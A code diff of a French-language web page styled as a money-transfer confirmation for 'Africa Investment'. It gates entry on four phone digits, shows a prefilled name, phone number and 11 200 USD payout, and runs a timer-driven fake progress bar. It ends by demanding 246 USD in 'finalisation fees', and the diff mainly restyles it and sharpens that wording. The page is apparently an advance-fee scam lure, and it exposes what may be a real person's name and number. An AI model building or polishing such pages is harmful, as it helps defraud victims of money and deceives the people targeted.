@@ -2,16 +2,20 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Transfert d'argent</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Transfert de Fonds - Africa Investment</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     * {
       box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Inter', sans-serif;
     }
 
     body {
-      margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: url('https://cdn.pixabay.com/photo/2017/12/27/09/32/stability-3042271_1280.jpg') no-repeat center center/cover;
       display: flex;
       justify-content: center;
@@ -22,67 +26,66 @@
     }
 
     .card {
-      background: rgba(255, 255, 255, 0.95);
-      padding: 40px 30px;
-      border-radius: 15px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+      background: rgba(255, 255, 255, 0.96);
+      padding: 35px 30px;
+      border-radius: 16px;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.2);
       width: 100%;
-      max-width: 420px;
-      animation: fadeIn 0.5s ease-in-out;
+      max-width: 430px;
+      animation: fadeIn 0.6s ease-in-out;
     }
 
     h1 {
-      color: #1d3557;
-      font-size: 24px;
-      margin-bottom: 25px;
+      color: #003366;
+      font-size: 22px;
+      margin-bottom: 24px;
+      font-weight: 700;
+      text-align: center;
     }
 
     .form-group {
-      margin-bottom: 20px;
+      margin-bottom: 18px;
     }
 
     label {
-      display: block;
       font-weight: 600;
       font-size: 14px;
       margin-bottom: 6px;
-      color: #444;
+      display: block;
     }
 
     input {
       width: 100%;
-      padding: 10px 14px;
-      font-size: 15px;
+      padding: 10px 12px;
       border: 1px solid #ccc;
-      border-radius: 6px;
-      transition: border 0.3s ease;
+      border-radius: 8px;
+      font-size: 15px;
     }
 
     input:focus {
-      border-color: #1d3557;
+      border-color: #0077b6;
       outline: none;
     }
 
     input[disabled] {
-      background: #f1f1f1;
+      background-color: #f1f1f1;
       color: #666;
-      cursor: not-allowed;
     }
 
     .btn {
       width: 100%;
       padding: 12px;
-      background-color: #1d3557;
-      color: white;
-      font-size: 16px;
+      background-color: #0077b6;
+      color: #fff;
+      font-size: 15px;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      font-weight: 600;
     }
 
     .btn:hover {
-      background-color: #0c254d;
+      background-color: #005f94;
     }
 
     .progress-container {
@@ -93,7 +96,7 @@
     .progress-title {
       text-align: center;
       margin-bottom: 8px;
-      color: #2a9d8f;
+      color: #0077b6;
       font-weight: 600;
       display: none;
     }
@@ -110,7 +113,7 @@
     .progress-bar {
       height: 100%;
       width: 0%;
-      background-color: #2a9d8f;
+      background-color: #00b894;
       transition: width 0.4s ease;
     }
 
@@ -127,72 +130,59 @@
     .notification-message,
     .access-error {
       margin-top: 15px;
-      font-weight: bold;
+      font-weight: 600;
       font-size: 14px;
       display: none;
       text-align: center;
     }
 
     .notification-message {
-      color: #e76f51;
+      color: #d35400;
     }
 
     .access-error {
-      color: #d90429;
+      color: #c0392b;
     }
 
     @keyframes fadeIn {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    @media (max-width: 480px) {
-      .card {
-        padding: 25px 20px;
-      }
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
-
   <div class="card" id="accessContainer">
-    <h1>Vérification du Code d'Accès</h1>
+    <h1>Vérification d'identité</h1>
     <div class="form-group">
-      <label for="accessCode">Entrez les quatres (04) derniers chiffres de votre numéro</label>
+      <label for="accessCode">Entrez les 4 derniers chiffres de votre numéro</label>
       <input type="password" id="accessCode" placeholder="Ex : 1234" required />
     </div>
     <button class="btn" onclick="checkAccessCode()">Valider</button>
-    <div class="access-error" id="accessError">Code d'accès incorrect.</div>
+    <div class="access-error" id="accessError">Code incorrect. Veuillez réessayer.</div>
   </div>
 
   <div class="card" id="formContainer" style="display: none;">
-    <h1>Paiement Bonus Invest</h1>
+    <h1>Confirmation de Transfert</h1>
 
-    <form id="tmoneyForm" onsubmit="return false;">
+    <form id="transferForm" onsubmit="return false;">
       <div class="form-group">
-        <label for="name">Nom et Prénom</label>
+        <label for="name">Nom et prénom</label>
         <input type="text" id="name" value="Rekab Wasivyo" disabled />
       </div>
 
       <div class="form-group">
-        <label for="phone">Numéro</label>
+        <label for="phone">Numéro de téléphone</label>
         <input type="tel" id="phone" value="+243 82 547 7601" disabled />
       </div>
 
       <div class="form-group">
         <label for="amount">Montant à recevoir</label>
-        <input type="text" id="amount" value="11.200 USD  " disabled />
+        <input type="text" id="amount" value="11 200 USD" disabled />
       </div>
 
-      <button class="btn" type="button" onclick="startProgress()">Procéder</button>
+      <button class="btn" type="button" onclick="startProgress()">Procéder au transfert</button>
 
-      <div class="progress-title" id="progressTitle">Transfert des fonds en cours...</div>
+      <div class="progress-title" id="progressTitle">Traitement du transfert en cours...</div>
 
       <div class="progress-container" id="progressContainer">
         <div class="progress-bar-wrapper">
@@ -202,8 +192,7 @@
       </div>
 
       <div class="notification-message" id="notificationMessage">
-         Action requise : Veillez payer les frais de finalisation du transfert.
-
+        Action requise : Veuillez régler les frais de finalisation (246 USD) pour recevoir l'intégralité de vos bénéfices.
       </div>
     </form>
   </div>
@@ -231,13 +220,13 @@
       const progressBar = document.getElementById("progressBar");
       const progressPercentage = document.getElementById("progressPercentage");
 
-      const totalTime = 2 * 60 * 1000;
-      const maxProgress = 99;
+      const totalTime = 90 * 1000;
+      const maxProgress = 100;
       const intervalTime = totalTime / maxProgress;
 
       const interval = setInterval(() => {
-        if (progress < maxProgress) {
-          progress += 1;
+        if (progress < 100) {
+          progress++;
           progressBar.style.width = progress + "%";
           progressPercentage.textContent = progress + "%";
         } else {
